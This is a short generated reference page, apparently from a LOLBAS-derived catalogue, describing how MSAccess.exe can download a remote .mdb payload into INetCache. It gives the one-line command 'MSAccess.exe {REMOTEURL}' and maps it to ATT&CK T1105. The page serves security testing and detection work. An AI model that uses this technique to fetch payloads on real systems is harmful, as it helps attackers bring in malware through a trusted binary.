---
parsed_by: focuslocust
source: commands
type: generated
---
# MSAccess Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## MSAccess.exe

Tool page: [MSAccess.exe](../../tools/windows/msaccess.exe.md)

### It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.

```text
MSAccess.exe {REMOTEURL}
```

Description:

Downloads payload from remote server

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Msaccess.yml` |
| Evidence | Command preserved from source parser. |
